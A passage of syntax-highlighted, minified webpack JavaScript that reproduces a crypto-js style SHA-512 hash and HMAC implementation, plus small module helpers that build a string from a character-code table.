class="number">602891725</span>), <span class="title function_">c</span>(<span class="number">3049323471</span>, <span class="number">3964484399</span>), <span class="title function_">c</span>(<span class="number">3921009573</span>, <span class="number">2173295548</span>), <span class="title function_">c</span>(<span class="number">961987163</span>, <span class="number">4081628472</span>), <span class="title function_">c</span>(<span class="number">1508970993</span>, <span class="number">3053834265</span>), <span class="title function_">c</span>(<span class="number">2453635748</span>, <span class="number">2937671579</span>), <span class="title function_">c</span>(<span class="number">2870763221</span>, <span class="number">3664609560</span>), <span class="title function_">c</span>(<span class="number">3624381080</span>, <span class="number">2734883394</span>), <span class="title function_">c</span>(<span class="number">310598401</span>, <span class="number">1164996542</span>), <span class="title function_">c</span>(<span class="number">607225278</span>, <span class="number">1323610764</span>), <span class="title function_">c</span>(<span class="number">1426881987</span>, <span class="number">3590304994</span>), <span class="title function_">c</span>(<span class="number">1925078388</span>, <span class="number">4068182383</span>), <span class="title function_">c</span>(<span class="number">2162078206</span>, <span class="number">991336113</span>), <span class="title function_">c</span>(<span class="number">2614888103</span>, <span class="number">633803317</span>), <span class="title function_">c</span>(<span class="number">3248222580</span>, <span class="number">3479774868</span>), <span class="title function_">c</span>(<span class="number">3835390401</span>, <span class="number">2666613458</span>), <span class="title function_">c</span>(<span class="number">4022224774</span>, <span class="number">944711139</span>), <span class="title function_">c</span>(<span class="number">264347078</span>, <span class="number">2341262773</span>), <span class="title function_">c</span>(<span class="number">604807628</span>, <span class="number">2007800933</span>), <span class="title function_">c</span>(<span class="number">770255983</span>, <span class="number">1495990901</span>), <span class="title function_">c</span>(<span class="number">1249150122</span>, <span class="number">1856431235</span>), <span class="title function_">c</span>(<span class="number">1555081692</span>, <span class="number">3175218132</span>), <span class="title function_">c</span>(<span class="number">1996064986</span>, <span class="number">2198950837</span>), <span class="title function_">c</span>(<span class="number">2554220882</span>, <span class="number">3999719339</span>), <span class="title function_">c</span>(<span class="number">2821834349</span>, <span class="number">766784016</span>), <span class="title function_">c</span>(<span class="number">2952996808</span>, <span class="number">2566594879</span>), <span class="title function_">c</span>(<span class="number">3210313671</span>, <span class="number">3203337956</span>), <span class="title function_">c</span>(<span class="number">3336571891</span>, <span class="number">1034457026</span>), <span class="title function_">c</span>(<span class="number">3584528711</span>, <span class="number">2466948901</span>), <span class="title function_">c</span>(<span class="number">113926993</span>, <span class="number">3758326383</span>), <span class="title function_">c</span>(<span class="number">338241895</span>, <span class="number">168717936</span>), <span class="title function_">c</span>(<span class="number">666307205</span>, <span class="number">1188179964</span>), <span class="title function_">c</span>(<span class="number">773529912</span>, <span class="number">1546045734</span>), <span class="title function_">c</span>(<span class="number">1294757372</span>, <span class="number">1522805485</span>), <span class="title function_">c</span>(<span class="number">1396182291</span>, <span class="number">2643833823</span>), <span class="title function_">c</span>(<span class="number">1695183700</span>, <span class="number">2343527390</span>), <span class="title function_">c</span>(<span class="number">1986661051</span>, <span class="number">1014477480</span>), <span class="title function_">c</span>(<span class="number">2177026350</span>, <span class="number">1206759142</span>), <span class="title function_">c</span>(<span class="number">2456956037</span>, <span class="number">344077627</span>), <span class="title function_">c</span>(<span class="number">2730485921</span>, <span class="number">1290863460</span>), <span class="title function_">c</span>(<span class="number">2820302411</span>, <span class="number">3158454273</span>), <span class="title function_">c</span>(<span class="number">3259730800</span>, <span class="number">3505952657</span>), <span class="title function_">c</span>(<span class="number">3345764771</span>, <span class="number">106217008</span>), <span class="title function_">c</span>(<span class="number">3516065817</span>, <span class="number">3606008344</span>), <span class="title function_">c</span>(<span class="number">3600352804</span>, <span class="number">1432725776</span>), <span class="title function_">c</span>(<span class="number">4094571909</span>, <span class="number">1467031594</span>), <span class="title function_">c</span>(<span class="number">275423344</span>, <span class="number">851169720</span>), <span class="title function_">c</span>(<span class="number">430227734</span>, <span class="number">3100823752</span>), <span class="title function_">c</span>(<span class="number">506948616</span>, <span class="number">1363258195</span>), <span class="title function_">c</span>(<span class="number">659060556</span>, <span class="number">3750685593</span>), <span class="title function_">c</span>(<span class="number">883997877</span>, <span class="number">3785050280</span>), <span class="title function_">c</span>(<span class="number">958139571</span>, <span class="number">3318307427</span>), <span class="title function_">c</span>(<span class="number">1322822218</span>, <span class="number">3812723403</span>), <span class="title function_">c</span>(<span class="number">1537002063</span>, <span class="number">2003034995</span>), <span class="title function_">c</span>(<span class="number">1747873779</span>, <span class="number">3602036899</span>), <span class="title function_">c</span>(<span class="number">1955562222</span>, <span class="number">1575990012</span>), <span class="title function_">c</span>(<span class="number">2024104815</span>, <span class="number">1125592928</span>), <span class="title function_">c</span>(<span class="number">2227730452</span>, <span class="number">2716904306</span>), <span class="title function_">c</span>(<span class="number">2361852424</span>, <span class="number">442776044</span>), <span class="title function_">c</span>(<span class="number">2428436474</span>, <span class="number">593698344</span>), <span class="title function_">c</span>(<span class="number">2756734187</span>, <span class="number">3733110249</span>), <span class="title function_">c</span>(<span class="number">3204031479</span>, <span class="number">2999351573</span>), <span class="title function_">c</span>(<span class="number">3329325298</span>, <span class="number">3815920427</span>), <span class="title function_">c</span>(<span class="number">3391569614</span>, <span class="number">3928383900</span>), <span class="title function_">c</span>(<span class="number">3515267271</span>, <span class="number">566280711</span>), <span class="title function_">c</span>(<span class="number">3940187606</span>, <span class="number">3454069534</span>), <span class="title function_">c</span>(<span class="number">4118630271</span>, <span class="number">4000239992</span>), <span class="title function_">c</span>(<span class="number">116418474</span>, <span class="number">1914138554</span>), <span class="title function_">c</span>(<span class="number">174292421</span>, <span class="number">2731055270</span>), <span class="title function_">c</span>(<span class="number">289380356</span>, <span class="number">3203993006</span>), <span class="title function_">c</span>(<span class="number">460393269</span>, <span class="number">320620315</span>), <span class="title function_">c</span>(<span class="number">685471733</span>, <span class="number">587496836</span>), <span class="title function_">c</span>(<span class="number">852142971</span>, <span class="number">1086792851</span>), <span class="title function_">c</span>(<span class="number">1017036298</span>, <span class="number">365543100</span>), <span class="title function_">c</span>(<span class="number">1126000580</span>, <span class="number">2618297676</span>), <span class="title function_">c</span>(<span class="number">1288033470</span>, <span class="number">3409855158</span>), <span class="title function_">c</span>(<span class="number">1501505948</span>, <span class="number">4234509866</span>), <span class="title function_">c</span>(<span class="number">1607167915</span>, <span class="number">987167468</span>), <span class="title function_">c</span>(<span class="number">1816402316</span>, <span class="number">1246189591</span>)]</span><br><span class="line">                    , u = [];</span><br><span class="line">                !<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="number">0</span>; t &lt; <span class="number">80</span>; t++)</span><br><span class="line">                        u[t] = <span class="title function_">c</span>()</span><br><span class="line">                &#125;();</span><br><span class="line">                <span class="keyword">var</span> l = a.<span class="property">SHA512</span> = e.<span class="title function_">extend</span>(&#123;</span><br><span class="line">                    <span class="attr">_doReset</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="property">_hash</span> = <span class="keyword">new</span> o.<span class="title function_">init</span>([<span class="keyword">new</span> i.<span class="title function_">init</span>(<span class="number">1779033703</span>, <span class="number">4089235720</span>), <span class="keyword">new</span> i.<span class="title function_">init</span>(<span class="number">3144134277</span>, <span class="number">2227873595</span>), <span class="keyword">new</span> i.<span class="title function_">init</span>(<span class="number">1013904242</span>, <span class="number">4271175723</span>), <span class="keyword">new</span> i.<span class="title function_">init</span>(<span class="number">2773480762</span>, <span class="number">1595750129</span>), <span class="keyword">new</span> i.<span class="title function_">init</span>(<span class="number">1359893119</span>, <span class="number">2917565137</span>), <span class="keyword">new</span> i.<span class="title function_">init</span>(<span class="number">2600822924</span>, <span class="number">725511199</span>), <span class="keyword">new</span> i.<span class="title function_">init</span>(<span class="number">528734635</span>, <span class="number">4215389547</span>), <span class="keyword">new</span> i.<span class="title function_">init</span>(<span class="number">1541459225</span>, <span class="number">327033209</span>)])</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">_doProcessBlock</span>: <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="variable language_">this</span>.<span class="property">_hash</span>.<span class="property">words</span>, r = n[<span class="number">0</span>], i = n[<span class="number">1</span>], o = n[<span class="number">2</span>], a = n[<span class="number">3</span>], c = n[<span class="number">4</span>], l = n[<span class="number">5</span>], h = n[<span class="number">6</span>], f = n[<span class="number">7</span>], d = r.<span class="property">high</span>, p = r.<span class="property">low</span>, v = i.<span class="property">high</span>, m = i.<span class="property">low</span>, g = o.<span class="property">high</span>, y = o.<span class="property">low</span>, b = a.<span class="property">high</span>, w = a.<span class="property">low</span>, _ = c.<span class="property">high</span>, x = c.<span class="property">low</span>, z = l.<span class="property">high</span>, M = l.<span class="property">low</span>, S = h.<span class="property">high</span>, C = h.<span class="property">low</span>, H = f.<span class="property">high</span>, T = f.<span class="property">low</span>, A = d, O = p, E = v, k = m, L = g, V = y, P = b, j = w, F = _, D = x, N = z, R = M, I = S, $ = C, B = H, U = T, q = <span class="number">0</span>; q &lt; <span class="number">80</span>; q++) &#123;</span><br><span class="line">                            <span class="keyword">var</span> Y = u[q];</span><br><span class="line">                            <span class="keyword">if</span> (q &lt; <span class="number">16</span>)</span><br><span class="line">                                <span class="keyword">var</span> W = Y.<span class="property">high</span> = <span class="number">0</span> | t[e + <span class="number">2</span> * q]</span><br><span class="line">                                    , X = Y.<span class="property">low</span> = <span class="number">0</span> | t[e + <span class="number">2</span> * q + <span class="number">1</span>];</span><br><span class="line">                            <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">var</span> G = u[q - <span class="number">15</span>]</span><br><span class="line">                                    , Z = G.<span class="property">high</span></span><br><span class="line">                                    , Q = G.<span class="property">low</span></span><br><span class="line">                                    , J = (Z &gt;&gt;&gt; <span class="number">1</span> | Q &lt;&lt; <span class="number">31</span>) ^ (Z &gt;&gt;&gt; <span class="number">8</span> | Q &lt;&lt; <span class="number">24</span>) ^ Z &gt;&gt;&gt; <span class="number">7</span></span><br><span class="line">                                    , K = (Q &gt;&gt;&gt; <span class="number">1</span> | Z &lt;&lt; <span class="number">31</span>) ^ (Q &gt;&gt;&gt; <span class="number">8</span> | Z &lt;&lt; <span class="number">24</span>) ^ (Q &gt;&gt;&gt; <span class="number">7</span> | Z &lt;&lt; <span class="number">25</span>)</span><br><span class="line">                                    , tt = u[q - <span class="number">2</span>]</span><br><span class="line">                                    , et = tt.<span class="property">high</span></span><br><span class="line">                                    , nt = tt.<span class="property">low</span></span><br><span class="line">                                    , rt = (et &gt;&gt;&gt; <span class="number">19</span> | nt &lt;&lt; <span class="number">13</span>) ^ (et &lt;&lt; <span class="number">3</span> | nt &gt;&gt;&gt; <span class="number">29</span>) ^ et &gt;&gt;&gt; <span class="number">6</span></span><br><span class="line">                                    , it = (nt &gt;&gt;&gt; <span class="number">19</span> | et &lt;&lt; <span class="number">13</span>) ^ (nt &lt;&lt; <span class="number">3</span> | et &gt;&gt;&gt; <span class="number">29</span>) ^ (nt &gt;&gt;&gt; <span class="number">6</span> | et &lt;&lt; <span class="number">26</span>)</span><br><span class="line">                                    , ot = u[q - <span class="number">7</span>]</span><br><span class="line">                                    , at = ot.<span class="property">high</span></span><br><span class="line">                                    , ct = ot.<span class="property">low</span></span><br><span class="line">                                    , st = u[q - <span class="number">16</span>]</span><br><span class="line">                                    , ut = st.<span class="property">high</span></span><br><span class="line">                                    , lt = st.<span class="property">low</span>;</span><br><span class="line">                                W = (W = (W = J + at + ((X = K + ct) &gt;&gt;&gt; <span class="number">0</span> &lt; K &gt;&gt;&gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>)) + rt + ((X += it) &gt;&gt;&gt; <span class="number">0</span> &lt; it &gt;&gt;&gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>)) + ut + ((X += lt) &gt;&gt;&gt; <span class="number">0</span> &lt; lt &gt;&gt;&gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>),</span><br><span class="line">                                    Y.<span class="property">high</span> = W,</span><br><span class="line">                                    Y.<span class="property">low</span> = X</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">var</span> ht, ft = F &amp; N ^ ~F &amp; I, dt = D &amp; R ^ ~D &amp; $, pt = A &amp; E ^ A &amp; L ^ E &amp; L,</span><br><span class="line">                                vt = O &amp; k ^ O &amp; V ^ k &amp; V,</span><br><span class="line">                                mt = (A &gt;&gt;&gt; <span class="number">28</span> | O &lt;&lt; <span class="number">4</span>) ^ (A &lt;&lt; <span class="number">30</span> | O &gt;&gt;&gt; <span class="number">2</span>) ^ (A &lt;&lt; <span class="number">25</span> | O &gt;&gt;&gt; <span class="number">7</span>),</span><br><span class="line">                                gt = (O &gt;&gt;&gt; <span class="number">28</span> | A &lt;&lt; <span class="number">4</span>) ^ (O &lt;&lt; <span class="number">30</span> | A &gt;&gt;&gt; <span class="number">2</span>) ^ (O &lt;&lt; <span class="number">25</span> | A &gt;&gt;&gt; <span class="number">7</span>),</span><br><span class="line">                                yt = (F &gt;&gt;&gt; <span class="number">14</span> | D &lt;&lt; <span class="number">18</span>) ^ (F &gt;&gt;&gt; <span class="number">18</span> | D &lt;&lt; <span class="number">14</span>) ^ (F &lt;&lt; <span class="number">23</span> | D &gt;&gt;&gt; <span class="number">9</span>),</span><br><span class="line">                                bt = (D &gt;&gt;&gt; <span class="number">14</span> | F &lt;&lt; <span class="number">18</span>) ^ (D &gt;&gt;&gt; <span class="number">18</span> | F &lt;&lt; <span class="number">14</span>) ^ (D &lt;&lt; <span class="number">23</span> | F &gt;&gt;&gt; <span class="number">9</span>), wt = s[q],</span><br><span class="line">                                _t = wt.<span class="property">high</span>, xt = wt.<span class="property">low</span>, zt = B + yt + ((ht = U + bt) &gt;&gt;&gt; <span class="number">0</span> &lt; U &gt;&gt;&gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>),</span><br><span class="line">                                <span class="title class_">Mt</span> = gt + vt;</span><br><span class="line">                            B = I,</span><br><span class="line">                                U = $,</span><br><span class="line">                                I = N,</span><br><span class="line">                                $ = R,</span><br><span class="line">                                N = F,</span><br><span class="line">                                R = D,</span><br><span class="line">                                F = P + (zt = (zt = (zt = zt + ft + ((ht += dt) &gt;&gt;&gt; <span class="number">0</span> &lt; dt &gt;&gt;&gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>)) + _t + ((ht += xt) &gt;&gt;&gt; <span class="number">0</span> &lt; xt &gt;&gt;&gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>)) + W + ((ht += X) &gt;&gt;&gt; <span class="number">0</span> &lt; X &gt;&gt;&gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>)) + ((D = j + ht | <span class="number">0</span>) &gt;&gt;&gt; <span class="number">0</span> &lt; j &gt;&gt;&gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>) | <span class="number">0</span>,</span><br><span class="line">                                P = L,</span><br><span class="line">                                j = V,</span><br><span class="line">                                L = E,</span><br><span class="line">                                V = k,</span><br><span class="line">                                E = A,</span><br><span class="line">                                k = O,</span><br><span class="line">                                A = zt + (mt + pt + (<span class="title class_">Mt</span> &gt;&gt;&gt; <span class="number">0</span> &lt; gt &gt;&gt;&gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>)) + ((O = ht + <span class="title class_">Mt</span> | <span class="number">0</span>) &gt;&gt;&gt; <span class="number">0</span> &lt; ht &gt;&gt;&gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>) | <span class="number">0</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        p = r.<span class="property">low</span> = p + O,</span><br><span class="line">                            r.<span class="property">high</span> = d + A + (p &gt;&gt;&gt; <span class="number">0</span> &lt; O &gt;&gt;&gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>),</span><br><span class="line">                            m = i.<span class="property">low</span> = m + k,</span><br><span class="line">                            i.<span class="property">high</span> = v + E + (m &gt;&gt;&gt; <span class="number">0</span> &lt; k &gt;&gt;&gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>),</span><br><span class="line">                            y = o.<span class="property">low</span> = y + V,</span><br><span class="line">                            o.<span class="property">high</span> = g + L + (y &gt;&gt;&gt; <span class="number">0</span> &lt; V &gt;&gt;&gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>),</span><br><span class="line">                            w = a.<span class="property">low</span> = w + j,</span><br><span class="line">                            a.<span class="property">high</span> = b + P + (w &gt;&gt;&gt; <span class="number">0</span> &lt; j &gt;&gt;&gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>),</span><br><span class="line">                            x = c.<span class="property">low</span> = x + D,</span><br><span class="line">                            c.<span class="property">high</span> = _ + F + (x &gt;&gt;&gt; <span class="number">0</span> &lt; D &gt;&gt;&gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>),</span><br><span class="line">                            M = l.<span class="property">low</span> = M + R,</span><br><span class="line">                            l.<span class="property">high</span> = z + N + (M &gt;&gt;&gt; <span class="number">0</span> &lt; R &gt;&gt;&gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>),</span><br><span class="line">                            C = h.<span class="property">low</span> = C + $,</span><br><span class="line">                            h.<span class="property">high</span> = S + I + (C &gt;&gt;&gt; <span class="number">0</span> &lt; $ &gt;&gt;&gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>),</span><br><span class="line">                            T = f.<span class="property">low</span> = T + U,</span><br><span class="line">                            f.<span class="property">high</span> = H + B + (T &gt;&gt;&gt; <span class="number">0</span> &lt; U &gt;&gt;&gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>)</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">_doFinalize</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                        <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="property">_data</span></span><br><span class="line">                            , e = t.<span class="property">words</span></span><br><span class="line">                            , n = <span class="number">8</span> * <span class="variable language_">this</span>.<span class="property">_nDataBytes</span></span><br><span class="line">                            , r = <span class="number">8</span> * t.<span class="property">sigBytes</span>;</span><br><span class="line">                        <span class="keyword">return</span> e[r &gt;&gt;&gt; <span class="number">5</span>] |= <span class="number">128</span> &lt;&lt; <span class="number">24</span> - r % <span class="number">32</span>,</span><br><span class="line">                            e[<span class="number">30</span> + (r + <span class="number">128</span> &gt;&gt;&gt; <span class="number">10</span> &lt;&lt; <span class="number">5</span>)] = <span class="title class_">Math</span>.<span class="title function_">floor</span>(n / <span class="number">4294967296</span>),</span><br><span class="line">                            e[<span class="number">31</span> + (r + <span class="number">128</span> &gt;&gt;&gt; <span class="number">10</span> &lt;&lt; <span class="number">5</span>)] = n,</span><br><span class="line">                            t.<span class="property">sigBytes</span> = <span class="number">4</span> * e.<span class="property">length</span>,</span><br><span class="line">                            <span class="variable language_">this</span>.<span class="title function_">_process</span>(),</span><br><span class="line">                            <span class="variable language_">this</span>.<span class="property">_hash</span>.<span class="title function_">toX32</span>()</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">clone</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                        <span class="keyword">var</span> t = e.<span class="property">clone</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">                        <span class="keyword">return</span> t.<span class="property">_hash</span> = <span class="variable language_">this</span>.<span class="property">_hash</span>.<span class="title function_">clone</span>(),</span><br><span class="line">                            t</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="attr">blockSize</span>: <span class="number">32</span></span><br><span class="line">                &#125;);</span><br><span class="line">                t.<span class="property">SHA512</span> = e.<span class="title function_">_createHelper</span>(l),</span><br><span class="line">                    t.<span class="property">HmacSHA512</span> = e.<span class="title function_">_createHmacHelper</span>(l)</span><br><span class="line">            &#125;(),</span><br><span class="line">            r.<span class="property">SHA512</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="number">5335</span>: <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r, i, o, a;</span><br><span class="line">        t.<span class="property">exports</span> = (r = <span class="title function_">n</span>(<span class="number">265</span>),</span><br><span class="line">            o = (i = r).<span class="property">lib</span>.<span class="property">Base</span>,</span><br><span class="line">            a = i.<span class="property">enc</span>.<span class="property">Utf8</span>,</span><br><span class="line">            <span class="keyword">void</span> (i.<span class="property">algo</span>.<span class="property">HMAC</span> = o.<span class="title function_">extend</span>(&#123;</span><br><span class="line">                <span class="attr">init</span>: <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                    t = <span class="variable language_">this</span>.<span class="property">_hasher</span> = <span class="keyword">new</span> t.<span class="property">init</span>,</span><br><span class="line">                    <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> e &amp;&amp; (e = a.<span class="title function_">parse</span>(e));</span><br><span class="line">                    <span class="keyword">var</span> n = t.<span class="property">blockSize</span></span><br><span class="line">                        , r = <span class="number">4</span> * n;</span><br><span class="line">                    e.<span class="property">sigBytes</span> &gt; r &amp;&amp; (e = t.<span class="title function_">finalize</span>(e)),</span><br><span class="line">                        e.<span class="title function_">clamp</span>();</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="variable language_">this</span>.<span class="property">_oKey</span> = e.<span class="title function_">clone</span>(), o = <span class="variable language_">this</span>.<span class="property">_iKey</span> = e.<span class="title function_">clone</span>(), c = i.<span class="property">words</span>, s = o.<span class="property">words</span>, u = <span class="number">0</span>; u &lt; n; u++)</span><br><span class="line">                        c[u] ^= <span class="number">1549556828</span>,</span><br><span class="line">                            s[u] ^= <span class="number">909522486</span>;</span><br><span class="line">                    i.<span class="property">sigBytes</span> = o.<span class="property">sigBytes</span> = r,</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="title function_">reset</span>()</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">reset</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="property">_hasher</span>;</span><br><span class="line">                    t.<span class="title function_">reset</span>(),</span><br><span class="line">                        t.<span class="title function_">update</span>(<span class="variable language_">this</span>.<span class="property">_iKey</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">update</span>: <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">_hasher</span>.<span class="title function_">update</span>(t),</span><br><span class="line">                        <span class="variable language_">this</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">finalize</span>: <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">_hasher</span></span><br><span class="line">                        , n = e.<span class="title function_">finalize</span>(t);</span><br><span class="line">                    <span class="keyword">return</span> e.<span class="title function_">reset</span>(),</span><br><span class="line">                        e.<span class="title function_">finalize</span>(<span class="variable language_">this</span>.<span class="property">_oKey</span>.<span class="title function_">clone</span>().<span class="title function_">concat</span>(n))</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)))</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="number">2</span>: <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">        t.<span class="property">exports</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> t &amp;&amp; t.<span class="property">__esModule</span> ? t : &#123;</span><br><span class="line">                <span class="attr">default</span>: t</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            ,</span><br><span class="line">            t.<span class="property">exports</span>.<span class="property">default</span> = t.<span class="property">exports</span>,</span><br><span class="line">            t.<span class="property">exports</span>.<span class="property">__esModule</span> = !<span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="number">3819</span>: <span class="keyword">function</span> (<span class="params">t, e, a</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> n, i, s;</span><br><span class="line">        <span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> globalThis ? globalThis : <span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> self &amp;&amp; self,</span><br><span class="line">            i = [e, <span class="title function_">a</span>(<span class="number">5336</span>)],</span><br><span class="line">        <span class="keyword">void</span> <span class="number">0</span> === (s = <span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> (n = <span class="keyword">function</span> (<span class="params">n, i</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> s = <span class="title function_">a</span>(<span class="number">2</span>);</span><br><span class="line">                <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(n, <span class="string">&quot;__esModule&quot;</span>, &#123;</span><br><span class="line">                    <span class="attr">value</span>: !<span class="number">0</span></span><br><span class="line">                &#125;),</span><br><span class="line">                    n.<span class="property">default</span> = <span class="keyword">void</span> <span class="number">0</span>,</span><br><span class="line">                    i = <span class="title function_">s</span>(i),</span><br><span class="line">                    n.<span class="property">default</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="variable language_">arguments</span>.<span class="property">length</span> &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== <span class="variable language_">arguments</span>[<span class="number">0</span>] ? <span class="variable language_">arguments</span>[<span class="number">0</span>] : <span class="string">&quot;/&quot;</span>, e = t.<span class="title function_">toLowerCase</span>(), a = e + e, n = <span class="string">&quot;&quot;</span>, s = <span class="number">0</span>; s &lt; a.<span class="property">length</span>; ++s) &#123;</span><br><span class="line">                            <span class="keyword">var</span> o = a[s].<span class="title function_">charCodeAt</span>() % i.<span class="property">default</span>.<span class="property">n</span>;</span><br><span class="line">                            n += i.<span class="property">default</span>.<span class="property">codes</span>[o]</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> n</span><br><span class="line">                    &#125;</span><br><span class="line">                    ,</span><br><span class="line">                    t.<span class="property">exports</span> = e.<span class="property">default</span></span><br><span class="line">            &#125;</span><br><span class="line">        ) ? n.<span class="title function_">apply</span>(e, i) : n) || (t.<span class="property">exports</span> = s)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="number">5336</span>: <span class="keyword">function</span> (<span class="params">t, e, a</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> n, i, s;</span><br><span class="line">        <span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> globalThis ? globalThis : <span class="string">&quot;undefined&quot;</span> != <span class="keyword">typeof</span> self &amp;&amp; self,</span><br><span class="line">            i = [e, <span class="title function_">a</span>(<span class="number">10</span>), <span class="title function_">a</span>(<span class="number">5337</span>), <span class="title function_">a</span>(<span class="number">5338</span>), <span class="title function_">a</span>(<span class="number">5339</span>), <span class="title function_">a</span>(<span class="number">5340</span>), <span class="title function_">a</span>(<span class="number">5341</span>), <span class="title function_">a</span>(<span class="number">5342</span>), <span class="title function_">a</span>(<span class="number">5343</span>), <span class="title function_">a</span>(<span class="number">5344</span>), <span class="title function_">a</span>(<span class="number">5345</span>), <span class="title function_">a</span>(<span class="number">5346</span>), <span class="title function_">a</span>(<span class="number">5347</span>), <span class="title function_">a</span>(<span class="number">5348</span>), <span class="title function_">a</span>(<span class="number">5349</span>), <span class="title function_">a</span>(<span class="number">5350</span>), <span class="title function_">a</span>(<span class="number">5351</span>), <span class="title function_">a</span>(<span class="number">5352</span>), <span class="title function_">a</span>(<span class="number">5353</span>), <span class="title function_">a</span>(<span class="number">5354</span>), <span class="title function_">a</span>(<span class="number">5355</span>), <span class="title function_">a</span>(<span class="number">5356</span>)],</span><br><span class="line">        <span class="keyword">void</span> <span class="number">0</span> === (s = <span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> (n = <span class="keyword">function</span> (<span class="params">n, i, s, o, r, c, l, u, d, f, p, h, m, v, y, g, b, _, C, k, O, w</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> x = <span class="title function_">a</span>(<span class="number">2</span>);</span><br><span class="line">                <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(n, <span class="string">&quot;__esModule&quot;</span>, &#123;</span><br><span class="line">                    <span class="attr">value</span>: !<span class="number">0</span></span><br><span class="line">                &#125;),</span><br><span class="line">                    n.<span class="property">default</span> = <span class="keyword">void</span> <span class="number">0</span>,</span><br><span class="line">                    i = <span class="title function_">x</span>(i),</span><br><span class="line">                    s = <span class="title function_">x</span>(s),</span><br><span class="line">                    o = <span class="title function_">x</span>(o),</span><br><span class="line">                    r = <span class="title function_">x</span>(r),</span><br><span class="line">                    c = <span class="title function_">x</span>(c),</span><br><span class="line">                    l = <span class="title function_">x</span>(l),</span><br><span class="line">                    u = <span class="title function_">x</span>(u),</span><br><span class="line">                    d = <span class="title function_">x</span>(d),</span><br><span class="line">                    f = <span class="title function_">x</span>(f),</span><br><span class="line">                    p = <span class="title function_">x</span>(p),</span><br><span class="line">                    h = <span class="title function_">x</span>(h),</span><br><span class="line">                    m = <span class="title function_">x</span>(m),</span><br><span class="line">                    v = <span class="title function_">x</span>(v),</span><br><span class="line">                    y = <span class="title function_">x</span>(y),</span><br><span class="line">                    g = <span class="title function_">x</span>(g),</span><br><span class="line">                    b = <span class="title function_">x</span>(b),</span><br><span class="line">                    _ = <span class="title function_">x</span>(_),</span><br><span class="line">                    C = <span class="title function_">x</span>(C),</span><br><span 